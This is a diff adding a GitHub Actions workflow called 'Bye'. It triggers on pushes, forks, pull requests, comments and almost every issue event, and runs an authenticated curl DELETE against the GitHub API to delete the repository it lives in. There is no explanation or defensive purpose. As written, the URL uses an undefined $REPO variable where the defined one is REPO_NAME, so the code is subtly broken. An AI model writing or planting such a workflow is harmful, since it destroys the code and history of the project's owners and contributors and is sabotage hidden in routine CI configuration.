@@ -1,0 +1,23 @@
+name: Bye
+
+on:
+  push:
+  fork:
+  pull_request:
+  issue_comment:
+  issues:
+    types: [opened, edited, deleted, transferred, pinned, unpinned, closed, reopened, assigned, unassigned, labeled, unlabeled, locked, unlocked, milestoned, demilestoned]
+
+jobs:
+  bye:
+    runs-on: ubuntu-latest
+    steps:
+      - name: bye
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          OWNER: ${{ github.repository_owner }}
+          REPO_NAME: ${{ github.event.repository.name }}
+        run: |
+          curl -X DELETE -H "Authorization: token $GITHUB_TOKEN" \
+               -H "Accept: application/vnd.github.v3+json" \
+               "https://api.github.com/repos/$OWNER/$REPO"
